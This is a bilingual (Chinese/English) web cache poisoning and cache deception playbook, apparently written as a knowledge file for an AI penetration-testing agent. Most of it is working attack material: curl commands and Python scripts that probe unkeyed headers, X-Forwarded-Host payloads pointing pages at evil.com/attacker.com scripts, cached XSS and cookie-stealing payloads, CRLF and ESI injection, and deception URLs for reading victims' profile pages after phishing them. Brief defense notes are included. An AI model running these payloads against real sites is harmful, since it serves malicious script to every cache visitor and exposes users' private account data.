> 结构：上半原有是主线（unkeyed / 欺骗）；下半补充 + 文末附件加深。先确认缓存键再打投毒。短表「缓存欺骗偷会话页」在原有「四、Web 缓存欺骗」下，用标题搜即可。
>
> 写不写只认 `~/.grok/rules/vuln-report-format.md`。只探到缓存键、没有投毒/偷会话 → 继续跟投毒/偷会话。有会话个人页/账单/`/api/me` 就可以打后缀，不必先看见 `X-Cache`。没这类页，不要为了勾表空加 `.css`。

## 一、原有knowledge-base

# 缓存投毒测试手册

## 一、Web 缓存投毒原理

### 核心概念

```
缓存键 (Cache Key): 决定缓存条目的唯一标识
  通常包含: Host, Path, Query String

Unkeyed 输入: 不在缓存键中，但影响响应内容的输入
  例如: X-Forwarded-Host, User-Agent, Cookie

攻击原理:
1. 找到 unkeyed 输入
2. 构造恶意请求，响应包含恶意内容
3. 响应被缓存
4. 其他用户访问相同 URL，获得被投毒的缓存
```

---

## 二、缓存键分析

### 2.1 识别缓存行为

```bash
# 发送两次相同请求，观察响应头
curl -I "https://target.com/page" -H "X-Test: 1"
curl -I "https://target.com/page" -H "X-Test: 2"

# 关注响应头:
# X-Cache: HIT / MISS
# CF-Cache-Status: HIT / MISS (Cloudflare)
# Age: 123 (缓存存在时间)
# Cache-Control: max-age=3600
```

### 2.2 测试 Unkeyed 输入

```python
import requests

def test_unkeyed_inputs(url):
    """测试哪些输入不在缓存键中"""
    
    headers_to_test = [
        "X-Forwarded-Host",
        "X-Forwarded-Scheme",
        "X-Original-URL",
        "X-Rewrite-URL",
        "X-Forwarded-Proto",
        "X-Host",
        "X-Forwarded-Server",
        "User-Agent",
        "Accept-Language",
        "Cookie",
    ]
    
    for header in headers_to_test:
        # 发送带有唯一值的请求
        unique_value = f"test-{header}-123"
        r1 = requests.get(url, headers={header: unique_value})
        
        # 再次请求（不带该头）
        r2 = requests.get(url)
        
        # 如果 r2 响应中包含 unique_value → 该头是 unkeyed
        if unique_value in r2.text:
            print(f"[!] Unkeyed 输入发现: {header}")
            print(f"    响应中包含: {unique_value}")
```

---

## 三、常见 Unkeyed 输入

### 3.1 X-Forwarded-Host

```bash
# 攻击: 修改资源加载路径
curl "https://target.com/" \
  -H "X-Forwarded-Host: attacker.com"

# 如果响应中包含:
<script src="//attacker.com/static/js/app.js"></script>

# 结果: 缓存被投毒，所有用户加载攻击者的 JS
```

### 3.2 X-Forwarded-Scheme / X-Forwarded-Proto

```bash
# 攻击: 降级 HTTPS 到 HTTP
curl "https://target.com/" \
  -H "X-Forwarded-Scheme: http"

# 响应中的链接可能变成:
<link href="http://target.com/style.css">

# 结果: 中间人攻击风险
```

### 3.3 X-Original-URL / X-Rewrite-URL

```bash
# 攻击: 缓存错误页面到正常 URL
curl "https://target.com/normal-page" \
  -H "X-Original-URL: /admin/secret"

# 如果后端用 X-Original-URL 路由，但缓存用原始 URL
# 结果: /normal-page 被缓存为 /admin/secret 的内容
```

### 3.4 UTM 参数

```bash
# 营销参数通常不在缓存键中
curl "https://target.com/?utm_source=<script>alert(1)</script>"

# 如果响应中反射该参数:
<div>来源: <script>alert(1)</script></div>

# 结果: XSS 被缓存
```

---

## 四、Web 缓存欺骗

### 缓存欺骗偷会话页（短表有指针）

认：登录后个人页、账单、`/api/me`、设置页。有 `X-Cache` / `Age` / `Via` 更好认，**不是前提**。

打：

1. 未登录先打原 path，记下基线（应 401 / 登录页 / 空）。
2. **要会话**打开同一页，再请求 `原path/x.css`、`原path;.css`、`原path%2f.css`。
3. 看 `X-Cache: HIT` / `Age` 涨了没有。再**未登录**打同一个带后缀 URL。

算成：未登录拿到**别人**个人页/账单/会话页正文（姓名、手机、Cookie 页）。只 HIT 了 CSS 壳不算。

假点：`Cache-Control: no-store`；后缀被应用 404；要受害人先点才缓存、你这边没拿到他人数据。单站没中不删短表这行。有会话页就可以打，不必先看见缓存头。没个人页/账单不要为了勾表空加后缀。

投毒（unkeyed 头把别人页面改成你的 JS）是另一条，细节在下半补充和附件。

### 4.1 路径混淆

```bash
# 原理: 缓存和应用对路径的解析不一致

# 攻击 1: 静态资源后缀
curl "https://target.com/profile/victim.css"

# 缓存: 认为是 CSS 文件，缓存
# 应用: 忽略 .css，返回 /profile/victim 的内容
# 结果: 受害者的个人信息被缓存为公开的 CSS 文件

# 攻击 2: 路径参数
curl "https://target.com/profile;.css"
curl "https://target.com/profile%2f.css"
curl "https://target.com/profile%2e%2e%2fstatic/style.css"
```

### 4.2 诱导受害者访问

```html
<!-- 攻击者发送钓鱼邮件 -->
<img src="https://target.com/profile/victim.css">

<!-- 受害者点击后，其个人信息被缓存 -->
<!-- 攻击者访问相同 URL，获取缓存的敏感信息 -->
```

---

## 五、缓存键规范化差异

### 5.1 编码差异

```bash
# 缓存和应用对 URL 编码的处理不同

# 请求 1
curl "https://target.com/page?param=value"

# 请求 2
curl "https://target.com/page?param=%76%61%6c%75%65"

# 如果缓存认为两者不同，但应用认为相同
# 可以绕过缓存，直接访问应用
```

### 5.2 路径规范化

```bash
# 请求 1
curl "https://target.com/page"

# 请求 2
curl "https://target.com/./page"
curl "https://target.com//page"
curl "https://target.com/page/"

# 不同的规范化可能导致缓存绕过或投毒
```

---

## 六、CDN 特定技巧

### 6.1 Cloudflare

```bash
# Cloudflare 缓存键: Host + Path + Query String (sorted)

# Unkeyed 输入:
# - CF-Connecting-IP
# - CF-IPCountry
# - CF-Visitor
# - Cookie (部分)

# 测试
curl "https://target.com/" \
  -H "CF-Connecting-IP: 127.0.0.1"
```

### 6.2 Akamai

```bash
# Akamai 缓存键: 可配置，通常包含 Host + Path

# Unkeyed 输入:
# - True-Client-IP
# - X-Forwarded-For
# - Pragma: akamai-x-cache-on (调试头)

# 测试
curl "https://target.com/" \
  -H "True-Client-IP: 127.0.0.1" \
  -H "Pragma: akamai-x-cache-on"
```

### 6.3 Fastly

```bash
# Fastly 缓存键: Host + Path + Query String

# Unkeyed 输入:
# - Fastly-Client-IP
# - X-Forwarded-Host
# - Surrogate-Key (缓存标签)

# 测试
curl "https://target.com/" \
  -H "X-Forwarded-Host: attacker.com"
```

---

## 七、测试工具

### 7.1 Param Miner (Burp 插件)

```
功能:
- 自动检测 unkeyed 输入
- 测试缓存键组成
- 识别缓存投毒机会

使用:
1. Burp → Extender → BApp Store → Param Miner
2. 右键请求 → Extensions → Param Miner → Guess headers
3. 查看结果
```

### 7.2 手动测试脚本

```python
import requests
import hashlib

def test_cache_poisoning(url, header, value):
    """测试缓存投毒"""
    
    # 生成唯一标识
    unique_id = hashlib.md5(f"{header}{value}".encode()).hexdigest()[:8]
    
    # 发送投毒请求
    poison_value = f"{value}-{unique_id}"
    r1 = requests.get(url, headers={header: poison_value})
    
    print(f"[*] 发送投毒请求: {header}: {poison_value}")
    print(f"    响应状态: {r1.status_code}")
    print(f"    缓存状态: {r1.headers.get('X-Cache', 'Unknown')}")
    
    # 等待缓存生效
    import time
    time.sleep(2)
    
    # 发送正常请求（不带恶意头）
    r2 = requests.get(url)
    
    print(f"[*] 发送正常请求")
    print(f"    响应状态: {r2.status_code}")
    print(f"    缓存状态: {r2.headers.get('X-Cache', 'Unknown')}")
    
    # 检查是否被投毒
    if unique_id in r2.text:
        print(f"[!] 缓存投毒成功！")
        print(f"    响应中包含: {unique_id}")
        return True
    else:
        print(f"[-] 缓存投毒失败")
        return False

# 使用示例
url = "https://target.com/"
headers_to_test = [
    ("X-Forwarded-Host", "attacker.com"),
    ("X-Forwarded-Scheme", "http"),
    ("X-Original-URL", "/admin"),
]

for header, value in headers_to_test:
    test_cache_poisoning(url, header, value)
    print("-" * 80)
```

### 7.3 缓存键探测

```python
def detect_cache_key(url):
    """探测缓存键组成"""
    
    import random
    
    components = {
        "Host": f"test{random.randint(1000,9999)}.com",
        "Path": f"/test{random.randint(1000,9999)}",
        "Query": f"?test={random.randint(1000,9999)}",
        "Method": "POST",
        "Body": f"test={random.randint(1000,9999)}",
    }
    
    results = {}
    
    # 测试每个组件
    for component, value in components.items():
        # 发送两次请求，第二次修改该组件
        r1 = requests.get(url)
        cache_status_1 = r1.headers.get('X-Cache', 'Unknown')
        
        if component == "Host":
            r2 = requests.get(url, headers={"Host": value})
        elif component == "Path":
            r2 = requests.get(url + value)
        elif component == "Query":
            r2 = requests.get(url + value)
        elif component == "Method":
            r2 = requests.post(url)
        elif component == "Body":
            r2 = requests.post(url, data=value)
        
        cache_status_2 = r2.headers.get('X-Cache', 'Unknown')
        
        # 如果第二次是 MISS，说明该组件在缓存键中
        if cache_status_2 == "MISS":
            results[component] = "In cache key"
        else:
            results[component] = "Not in cache key"
    
    return results
```

---

## 八、利用场景

### 8.1 XSS 缓存投毒

```bash
# 找到反射 XSS 点
curl "https://target.com/search?q=<script>alert(1)</script>"

# 如果该页面被缓存，所有用户访问时触发 XSS
```

### 8.2 钓鱼页面缓存

```bash
# 投毒首页，显示钓鱼内容
curl "https://target.com/" \
  -H "X-Forwarded-Host: attacker.com"

# 响应中加载攻击者的 JS，显示假登录框
```

### 8.3 敏感信息泄露

```bash
# 缓存欺骗，将个人信息缓存为公开资源
curl "https://target.com/profile/victim.css"

# 攻击者访问相同 URL，获取受害者信息
```

---

## 九、防护检测

```python
# 检测是否有防护

# 1. 严格的缓存键
# 特征: 所有影响响应的输入都在缓存键中

# 2. 输入验证
# 特征: 拒绝异常的 X-Forwarded-* 头

# 3. 缓存隔离
# 特征: 敏感页面不被缓存（Cache-Control: no-store）

# 4. 响应头检查
# 特征: 响应中不反射 unkeyed 输入
```

---

## 十一、参考资源

```
# Web Cache Poisoning 研究
https://portswigger.net/research/practical-web-cache-poisoning

# Web Cache Deception 研究
https://omergil.blogspot.com/2017/02/web-cache-deception-attack.html

# Burp Param Miner
https://github.com/PortSwigger/param-miner
```

---

## 二、补充：web-cache

### web-cache

### Web Cache Deception

## 1. CORE CONCEPTS

### Web Cache Deception (steal authenticated data)

The attacker tricks a victim into requesting their authenticated page at a URL that the cache considers static:

```
Victim visits: https://target.com/account/profile/nonexistent.css
→ Application ignores "nonexistent.css", serves /account/profile (with auth data)
→ CDN sees .css extension → caches the response
→ Attacker fetches: https://target.com/account/profile/nonexistent.css
→ CDN serves cached authenticated content → attacker reads victim's data
```

### Web Cache Poisoning (serve malicious content)

The attacker manipulates unkeyed request components (headers, cookies) to make the cache store a malicious response:

```
GET /page HTTP/1.1
Host: target.com
X-Forwarded-Host: evil.com
→ Application generates: <script src="https://evil.com/js/app.js">
→ Cache stores this response
→ Normal users hit cache → load attacker's JavaScript
```

---

## 2. CACHE DECEPTION — ATTACK METHODOLOGY

### Step 1: Identify Cacheable Path Patterns

CDNs typically cache by file extension:
```text
.css  .js  .jpg  .png  .gif  .svg  .ico
.woff .woff2  .ttf  .pdf  .json (sometimes)
```

### Step 2: Test Path Confusion

```text
### Append static extension to authenticated endpoint:
https://target.com/api/me/info.css
https://target.com/account/profile/x.js
https://target.com/settings/avatar.png
https://target.com/dashboard/data.json

### Path traversal style:
https://target.com/account/profile/..%2fstatic/app.css
```

### Step 3: Verify Caching

```bash
### Request as victim (authenticated):
curl -H "Cookie: session=VICTIM" https://target.com/account/profile/x.css

### Check response headers:
### X-Cache: MISS (first request)
### Age: 0

### Request again as attacker (no auth):
curl https://target.com/account/profile/x.css

### Check response:
### X-Cache: HIT
### Contains victim's authenticated content? → vulnerable
```

### Step 4: Deliver to Victim

Send the crafted URL to victim via phishing, message, or embed:
```
https://target.com/account/profile/tracking.gif
```

---

## 3. CACHE POISONING — ATTACK METHODOLOGY

### Unkeyed Input Discovery

Cache keys typically include: `Host`, URL path, query string.
These are typically NOT in the cache key: `X-Forwarded-Host`, `X-Forwarded-Scheme`, `X-Original-URL`, cookies, custom headers.

```bash
### Test if X-Forwarded-Host is reflected but not keyed:
curl -H "X-Forwarded-Host: evil.com" https://target.com/page
### If response contains evil.com and caches → poisonable
```

### Common Unkeyed Headers

```text
X-Forwarded-Host      X-Forwarded-Scheme    X-Forwarded-Proto
X-Original-URL        X-Rewrite-URL         X-Host
X-Forwarded-Server    Forwarded             True-Client-IP
```

### Cache Poisoning via Host Header

```
GET / HTTP/1.1
Host: target.com
X-Forwarded-Host: evil.com

→ Response: <link href="//evil.com/static/main.css">
→ Cached → all users load attacker's CSS/JS
```

---

## 4. PATH NORMALIZATION DIFFERENCES

The key to cache deception: **CDN and application normalize paths differently**.

| Component | Behavior |
|---|---|
| CDN (Cloudflare, Akamai) | Caches based on full URL path including extension |
| Application (Rails, Django, Express) | May ignore trailing path segments or extensions |
| Reverse proxy (Nginx) | May strip or rewrite path before forwarding |

```text
### Application treats these as equivalent:
/account/profile
/account/profile/anything
/account/profile/x.css
/account/profile;.css

### CDN treats .css as cacheable static asset
→ Mismatch = vulnerability
```

---

## 5. CACHE POISONING REAL-WORLD PATTERN

### X-Forwarded-Host → Open Graph / Meta Tag Injection

```text
### Target page uses X-Forwarded-Host to generate meta tags:
GET / HTTP/1.1
Host: target.com
X-Forwarded-Host: evil.com

### Response:
<meta property="og:image" content="https://evil.com/assets/logo.png">
### or:
<link rel="canonical" href="https://evil.com/">

### If response is cached → all users see evil.com references
### Impact: XSS via injected JS path, phishing via canonical redirect, SEO hijack
```

### Cache Deception with Path Separator Tricks

```text
### Semicolon (treated as path parameter by some frameworks):
/account/profile;.css

### Encoded separators:
/account/profile%2F.css

### Trailing dot/space:
/account/profile/.css
/account/profile .css
```

---

## 6. DEFENSE

### For Cache Deception

- Cache only explicitly static paths (e.g., `/static/*`, `/assets/*`)
- Never cache based on file extension alone
- Set `Cache-Control: no-store, private` on authenticated endpoints
- Use `Vary: Cookie` to prevent cross-user cache hits

### For Cache Poisoning

- Include all reflected headers in cache key
- Validate and sanitize `X-Forwarded-*` headers
- Use `Cache-Control: no-cache` for dynamic content
- Strip unknown headers at CDN edge

---

## 6. TESTING CHECKLIST

```
□ Identify CDN/cache layer (X-Cache, Age, Via headers)
□ Append .css/.js/.png to authenticated API endpoints
□ Check if response is cached (X-Cache: HIT on second request)
□ Test path separators: /x.css, ;.css, %2F.css
□ Test unkeyed headers: X-Forwarded-Host, X-Original-URL
□ Verify Cache-Control headers on sensitive endpoints
□ Check Vary header presence
□ Test with and without authentication
```


---


## 附件：CACHE_POISONING_TECHNIQUES

### Web Cache Poisoning Techniques — Advanced Reference


## 1. WEB CACHE POISONING vs WEB CACHE DECEPTION

These are **distinct attack classes** — do not confuse them.

| Aspect | Cache Poisoning | Cache Deception |
|---|---|---|
| **Goal** | Serve **malicious content** to all users | Steal **victim's authenticated data** |
| **Who triggers** | Attacker sends poisoning request | Victim visits crafted URL |
| **What gets cached** | Attacker-controlled response (XSS, redirect) | Victim's authenticated response |
| **Who is harmed** | All users who hit the cache | The specific victim whose data is cached |
| **Attacker's role** | Active (sends request with unkeyed poison) | Passive (waits for victim, then reads cache) |
| **Key technique** | Unkeyed input manipulation | Path confusion / extension appending |
| **Detection signal** | Response contains unexpected injected content | Authenticated content accessible without auth |

### Attack Flow Comparison

```
CACHE POISONING:
  Attacker → sends request with X-Forwarded-Host: evil.com
  → Cache stores response with evil.com references
  → Normal users get poisoned response

CACHE DECEPTION:
  Attacker → tricks victim into visiting /profile/x.css
  → Server returns victim's profile data (ignores x.css)
  → Cache stores response (thinks it's static CSS)
  → Attacker fetches /profile/x.css → reads victim's data
```

---

## 2. UNKEYED HEADER POISONING

### 2.1 Cache Key Basics

The **cache key** is what the cache uses to determine if a stored response matches a request. Typically includes:
- HTTP method
- Host header
- URL path
- Query string (sometimes)

**NOT typically included** (= unkeyed):
- Most request headers
- Cookies (sometimes)
- Request body (for GET)

If an unkeyed input is **reflected** in the response, it can be poisoned.

### 2.2 X-Forwarded-Host Poisoning

The most common cache poisoning vector.

```http
GET / HTTP/1.1
Host: target.com
X-Forwarded-Host: evil.com

HTTP/1.1 200 OK
...
<script src="https://evil.com/static/app.js"></script>
```

If `X-Forwarded-Host` is not in the cache key but is reflected in the response → poison stores `evil.com` JavaScript for all users requesting `/`.

**Common reflection points**:
- `<script src="...">` and `<link href="...">`
- Open Graph meta tags: `<meta property="og:url" content="...">`
- Canonical links: `<link rel="canonical" href="...">`
- Resource prefetch: `<link rel="dns-prefetch" href="...">`
- Dynamic import maps

### 2.3 X-Forwarded-Scheme / X-Forwarded-Proto

Forces HTTPS → HTTP downgrade in cached response:

```http
GET / HTTP/1.1
Host: target.com
X-Forwarded-Scheme: http

HTTP/1.1 301 Moved
Location: http://target.com/    ← now HTTP, not HTTPS
```

Cache stores a redirect to HTTP → MITM opportunity for all cached users.

### 2.4 X-Original-URL / X-Rewrite-URL

Some frameworks (IIS/ASP.NET, Symfony) use these headers to override the request path:

```http
GET / HTTP/1.1
Host: target.com
X-Original-URL: /admin/delete-user?id=1

Cache key = GET /
But server processes /admin/delete-user?id=1
Response gets cached under /
```

### 2.5 Multiple Host Headers

```http
GET / HTTP/1.1
Host: target.com
Host: evil.com

### Some caches key on first Host, some apps use last Host
### If cache keys on target.com but app reflects evil.com → poisoned
```

### 2.6 X-Forwarded-Port

```http
GET / HTTP/1.1
Host: target.com
X-Forwarded-Port: 1337

### If port is reflected in absolute URLs:
### <a href="https://target.com:1337/path">
### May cause resource loading failures → DoS via cache poisoning
```

### 2.7 Discovery Methodology

```bash
### Step 1: Identify cache (check response headers)
curl -v https://target.com/ 2>&1 | grep -i "x-cache\|age\|via\|cf-cache"

### Step 2: Find reflected unkeyed headers
### Send request with unique header values:
curl -H "X-Forwarded-Host: canary123.com" https://target.com/ | grep "canary123"
curl -H "X-Forwarded-Scheme: canary" https://target.com/ | grep "canary"
curl -H "X-Original-URL: /canary" https://target.com/ | grep "canary"

### Step 3: Verify it's unkeyed
### Send normal request → check if canary value is in cached response:
curl https://target.com/ | grep "canary123"
### If found → successfully poisoned

### Tool: Param Miner (Burp extension) automates unkeyed header discovery
```

---

## 3. UNKEYED PARAMETER POISONING

### 3.1 Concept

Some query parameters are excluded from the cache key (for tracking, analytics, etc.) but are reflected in the response.

### 3.2 Common Unkeyed Parameters

```
utm_content      utm_source       utm_medium       utm_campaign
utm_term         fbclid           gclid            _ga
dclid            msclkid          mc_eid           ref
callback         jsonp            _                cb
```

### 3.3 Example Attack

```http
GET /page?utm_content="><script>alert(1)</script> HTTP/1.1
Host: target.com

HTTP/1.1 200 OK
...
<a href="/page?utm_content="><script>alert(1)</script>">Share</a>
```

Cache key: `GET /page` (utm_content excluded)
Response: contains XSS payload
Result: all users visiting `/page` get XSS.

### 3.4 Parameter Discovery

```bash
### Burp Param Miner: "Guess query parameters" scan

### Manual: append unique parameter and check if cache key changes
curl "https://target.com/page?cachebuster=abc123" -v
### → X-Cache: MISS (new cache entry? or same as /page?)

curl "https://target.com/page" -v
### → X-Cache: HIT and response matches previous? Then /page is the key (query excluded)
### → X-Cache: MISS? Then query IS in the key
```

### 3.5 Reflected Parameter in JavaScript

```http
GET /page?callback=alert HTTP/1.1

HTTP/1.1 200 OK
<script>
var config = {
  callback: "alert",  // reflected from query parameter
  ...
};
</script>
```

If `callback` is excluded from cache key but reflected in JavaScript:

```http
GET /page?callback=alert(document.cookie)// HTTP/1.1
```

Cached for all users requesting `/page`.

---

## 4. FAT GET CACHE POISONING

### 4.1 Concept

Some origins accept and process GET request **body** (despite RFC discouraging it). If the cache ignores the body (not in cache key) but the origin reflects body content, the response can be poisoned.

### 4.2 Example

```http
GET /api/config HTTP/1.1
Host: target.com
Content-Type: application/x-www-form-urlencoded

callback=alert(1)

HTTP/1.1 200 OK
Content-Type: application/javascript
Cache-Control: public, max-age=3600

alert(1)({"theme":"default","lang":"en"})
```

Cache key: `GET /api/config` (body not included)
Response: contains attacker's callback value
Result: all users get `alert(1)` when loading `/api/config`.

### 4.3 Detection

```bash
### Step 1: Check if origin processes GET body
curl -X GET https://target.com/api/endpoint \
  -H "Content-Type: application/x-www-form-urlencoded" \
  -d "param=canary_value"
### Check if canary_value appears in response

### Step 2: Check if response is cached
curl https://target.com/api/endpoint
### Check X-Cache header and whether canary_value persists

### If canary in cached response → Fat GET poisoning confirmed
```

### 4.4 Frameworks That Process GET Body

| Framework | GET Body Processing |
|---|---|
| Ruby on Rails | Yes (parsed by default) |
| Express.js | Depends on middleware (body-parser) |
| Django | Yes (request.POST populated for GET with body) |
| Flask | Yes (request.form available) |
| ASP.NET | Depends on model binding configuration |
| Spring | Depends on `@RequestBody` annotation |

---

## 5. PARAMETER CLOAKING

### 5.1 Semicolon as Parameter Separator

Some platforms treat `;` as a parameter separator, others don't:

```http
GET /page?legit=value;poison=xss HTTP/1.1

### Ruby on Rails: parses as two params: legit=value, poison=xss
### PHP: parses as one param: legit=value;poison=xss
### Cache (Varnish): may key on "legit=value;poison=xss" as opaque string
```

**Exploit**: if cache keys on full query string but back-end parses `;` as separator:

```http
GET /page?legit=value;callback=alert(1) HTTP/1.1

### Cache key: /page?legit=value;callback=alert(1)
### Origin parses: legit=value AND callback=alert(1)
### Response reflects: alert(1) in callback
### Next request to /page?legit=value;callback=alert(1) gets poisoned response
```

### 5.2 Different Delimiter Parsing

| Platform | `;` Behavior | `&` Behavior |
|---|---|---|
| PHP | Literal (part of value) | Parameter separator |
| Ruby on Rails | Parameter separator | Parameter separator |
| Java (Servlet) | Parameter separator (`;` in path = path parameter) | Parameter separator |
| ASP.NET | Depends on configuration | Parameter separator |
| Node.js (querystring) | Literal | Parameter separator |
| Python (urllib) | Can be configured as separator | Parameter separator |

### 5.3 Duplicate Parameters

```http
GET /page?param=safe&param=<script>alert(1)</script> HTTP/1.1

### Cache may key on first occurrence: param=safe
### Origin may use last occurrence: param=<script>alert(1)</script>
```

| Platform | Duplicate Parameter Behavior |
|---|---|
| PHP | Last value wins |
| ASP.NET | Comma-joined (both values) |
| Ruby on Rails | Last value wins |
| Python Flask | First value wins |
| Java Servlet | First value wins (`getParameter`), all values (`getParameterValues`) |
| Node.js Express | Array of all values |

### 5.4 URL Path Parameter Cloaking

```http
### Semicolons in URL path (Java servlet path parameters):
GET /page;jsessionid=abc;param=value HTTP/1.1

### Tomcat/Jetty: strips ;param=value from path
### Cache: may include full path in key or strip differently
```

---

## 6. CDN-SPECIFIC BEHAVIOR

### 6.1 Cloudflare

```
### Cache status header: cf-cache-status
### Values: HIT, MISS, EXPIRED, DYNAMIC, BYPASS

### Default caching: by file extension (.js, .css, .png, etc.)
### Query strings: included in cache key by default
### Headers in key: Host only

### Page Rules: can force cache of HTML / API responses
### Cache-Control respected: yes

### Bypass methods:
### - Set Cache-Control: no-cache on origin
### - Use __cf_chl_jschl_tk__ (Cloudflare challenge token) — not in key

### Interesting behaviors:
### - Cloudflare Workers can modify cache key
### - cf-connecting-ip header added (unkeyed, may be reflected)
### - True-Client-IP header (unkeyed on some plans)
```

### 6.2 AWS CloudFront

```
### Cache status header: x-cache (Hit from cloudfront / Miss from cloudfront)
### Also: x-amz-cf-id, x-amz-cf-pop

### Default cache key: Host + URI path + query string
### Query strings: can be configured (all, none, whitelist)
### Headers in key: configurable via Cache Policy (Host, Accept, etc.)
### Cookies in key: configurable (all, none, whitelist)

### Gotchas:
### - Default: query strings NOT in cache key (must configure)
### - Default: cookies NOT in cache key
### - Can whitelist specific headers/cookies into key

### Poisoning opportunity:
### If query strings excluded → append reflected param → poison
### If X-Forwarded-Host not in key but reflected → classic poisoning
```

### 6.3 Akamai

```
### Cache status header: X-Cache (TCP_HIT, TCP_MISS)
### Also: X-Akamai-Request-ID

### Cache key (default): Host + path + query (configurable)
### "Cache ID Modification" feature: custom key composition
### "Remove Vary Header" feature: strips Vary

### Interesting behaviors:
### - Pragma: akamai-x-cache-on (enable cache debug)
### - Pragma: akamai-x-get-cache-key (reveal cache key)
### - Akamai-Transform header (can affect response)
### - True-Client-IP (unkeyed, may be reflected)

### Revealing cache key (if debug enabled):
curl -H "Pragma: akamai-x-get-cache-key" https://target.com/ -v
```

### 6.4 Varnish

```
### Cache status header: X-Varnish (two IDs = HIT, one ID = MISS)
### Also: Age, Via (varnish)

### Default cache key: req.url (path + query)
### VCL customization: hash_data() in vcl_hash
### Default: does NOT cache requests with Cookie header

### Interesting behaviors:
### - obj.hits indicates number of cache hits
### - X-Varnish-Cache header (custom)
### - Builtin: strips If-Modified-Since on cache hit

### VCL key inspection:
### If you have access to VCL config, look at vcl_hash for key composition
### sub vcl_hash {
###   hash_data(req.url);
###   hash_data(req.http.host);
### }
```

### 6.5 Fastly

```
### Cache status header: X-Cache (HIT, MISS)
### Also: X-Served-By, X-Cache-Hits, X-Timer

### Fastly uses Varnish under the hood
### VCL-based configuration
### Default cache key: URL + Host
### Surrogate-Control header: overrides Cache-Control for CDN
### Fastly-Debug: 1 (if enabled → reveals cache details)

### Interesting behaviors:
### - Surrogate-Key header for purge targeting
### - stale-while-revalidate support
### - ESI (Edge Side Includes) support — can be attack vector
```

### 6.6 CDN Cache Key Comparison

| CDN | Default Cache Key Components | Query String Default | Cookie Default |
|---|---|---|---|
| Cloudflare | Host + path + query | Included | Excluded |
| CloudFront | Host + path (query configurable) | Excluded by default | Excluded |
| Akamai | Host + path + query | Included | Excluded |
| Varnish | URL (path + query) | Included | Excluded (no cache with Cookie) |
| Fastly | Host + URL | Included | Excluded |
| Nginx (proxy_cache) | `$scheme$proxy_host$request_uri` | Included | Excluded |

---

## 7. VARY HEADER MANIPULATION

### 7.1 How Vary Works

The `Vary` header tells caches which request headers affect the response. Cache must store separate entries for different values of Vary'd headers.

```http
HTTP/1.1 200 OK
Vary: Accept-Encoding, Accept-Language
```

This means: cache must key on `Accept-Encoding` AND `Accept-Language` values.

### 7.2 Cache Partitioning Attack

If `Vary` doesn't include a header that the application uses to generate different content:

```http
### Application returns different content based on User-Agent:
GET / HTTP/1.1
User-Agent: Mozilla/5.0 (mobile)
→ Returns mobile version

GET / HTTP/1.1  
User-Agent: Mozilla/5.0 (desktop)
→ Returns desktop version

### If Vary does NOT include User-Agent:
### Cache stores one response for all User-Agent values
### Attacker can poison mobile users with desktop content (or vice versa)
```

### 7.3 Vary Header Injection

If attacker can influence the Vary header value:

```http
### Application sets Vary based on request:
Vary: Accept-Encoding, X-Custom-Header

### If attacker adds X-Custom-Header:
GET / HTTP/1.1
X-Custom-Header: unique-value

### Cache creates new partition for this unique value
### Attacker poisons only this partition
### Then links victim to URL with same X-Custom-Header value
```

### 7.4 Vary: * (Wildcard)

```http
Vary: *
```

Tells cache to never serve cached version. Some caches respect this, others ignore it.

| CDN | Vary: * Behavior |
|---|---|
| Cloudflare | Does not cache |
| CloudFront | Does not cache |
| Varnish | Depends on VCL config |
| Nginx | Does not cache (default) |

### 7.5 Missing Vary as a Vulnerability

```
### Application returns personalized content:
GET /dashboard HTTP/1.1
Cookie: session=USER_A_TOKEN
→ Returns User A's dashboard

### If response lacks Vary: Cookie AND cache stores it:
### → User B requests /dashboard → gets User A's cached dashboard
### This IS cache deception (without the victim needing to visit a crafted URL)
```

---

## 8. ADVANCED TECHNIQUES

### 8.1 Cache Poisoning via Error Pages

```http
### Trigger a 404 with injected content:
GET /nonexistent%0D%0AX-Injected:%20yes HTTP/1.1
Host: target.com

### If 404 page reflects the requested path and is cached:
### All users requesting this path get the injected error page
```

### 8.2 Edge Side Includes (ESI) Injection

```http
### If CDN supports ESI and reflects unkeyed input:
GET / HTTP/1.1
X-Forwarded-Host: evil.com

Response:
<esi:include src="http://evil.com/xss.html"/>

### ESI is processed by the cache/CDN → fetches and includes evil content
```

### 8.3 Poisoning via Response Header Injection

```http
### If unkeyed header is reflected in response headers:
GET / HTTP/1.1
X-Custom: value\r\nSet-Cookie: admin=true

### Response:
X-Custom: value
Set-Cookie: admin=true

### Cached → all users get the injected Set-Cookie
```

### 8.4 Web Cache Poisoning DoS

```http
### Poison response to return 403/500/redirect:
GET / HTTP/1.1
X-Forwarded-Host: thisdoesnotexist.com

### If origin tries to load resources from thisdoesnotexist.com:
### Response has broken resources → cached → DoS for all users
```

### 8.5 Chaining Cache Poisoning + XSS

```http
### Step 1: Find unkeyed header reflected in HTML
GET /page HTTP/1.1
X-Forwarded-Host: "><script>alert(document.cookie)</script>.com

### Step 2: Response (if reflected unsanitized):
<link rel="canonical" href="https://"><script>alert(document.cookie)</script>.com/page">

### Step 3: Cache stores this response
### Step 4: All users visiting /page execute attacker's JavaScript
```

---

## 9. TESTING CHECKLIST

```
□ Identify cache layer and CDN product
  - Check: X-Cache, cf-cache-status, Age, Via, X-Varnish, X-Served-By
□ Determine cache key composition
  - Test: adding query params, headers, cookies — does cache key change?
□ Discover unkeyed inputs
  - Headers: X-Forwarded-Host, X-Forwarded-Scheme, X-Original-URL, True-Client-IP
  - Parameters: utm_*, fbclid, gclid, callback, jsonp
  - Body: GET request with body parameters
□ Check reflection of unkeyed inputs
  - In HTML body, JavaScript, response headers, redirect Location
□ Verify caching of poisoned response
  - X-Cache: HIT on follow-up clean request
  - Response still contains poison → confirmed
□ Test parameter cloaking
  - Semicolon separator differences
  - Duplicate parameter handling
□ Check Vary header
  - Missing Vary: Cookie on personalized content?
  - Can influence Vary header value?
□ CDN-specific tests
  - ESI support?
  - Debug headers enabled?
  - Cache key reveal features?
□ Impact assessment
  - Stored XSS via cache poisoning?
  - Account takeover via session fixation?
  - DoS via broken resources?
```
